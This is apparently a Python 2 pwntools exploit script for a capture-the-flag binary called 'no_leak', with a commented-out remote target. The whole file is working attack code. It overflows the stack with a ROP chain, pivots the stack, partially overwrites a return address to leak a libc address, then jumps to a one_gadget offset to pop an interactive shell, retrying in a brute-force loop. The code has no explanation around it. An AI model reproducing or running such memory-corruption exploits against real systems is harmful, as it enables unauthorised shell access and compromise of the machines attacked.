#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *

cnt = 1
while True : 
    print "TRY : " + str(cnt)

    try : 
        p = process("./no_leak")
        #p = remote("nc.eonew.cn",10002)
        # gdb.attach(p,"b *0x40055A\n")
        prsi15 = 0x00000000004005d1
        read = 0x0000000000400440
        leaveret = 0x0000000000400564
        prdi = 0x00000000004005d3
        main = 0x0000000000400537
        _start = 0x0000000000400450

        pay = "A" * 0x80 + p64(0x601b00-8) + p64(prsi15) + p64(0x601b00)*2 + p64(read) + p64(prsi15) + p64(0x601a40)*2 + p64(read) + p64(leaveret)

        sleep(0.1)
        p.sendline(pay)

        sleep(0.1)
        p.sendline(p64(_start))

        sleep(0.1)
        p.sendline(p64(main))

        sleep(0.1)
        p.send("A"*0x88+"\x77\xcc")

        p.recvuntil("A"*0x88)
        
        libc = u64(p.recv(8)) - 0x21c77

        print hex(libc)

        sleep(0.1)
        p.sendline("A"*0x88+p64(libc+0x10a38c))

        p.interactive()

        break
    except :
        p.close()
    cnt += 1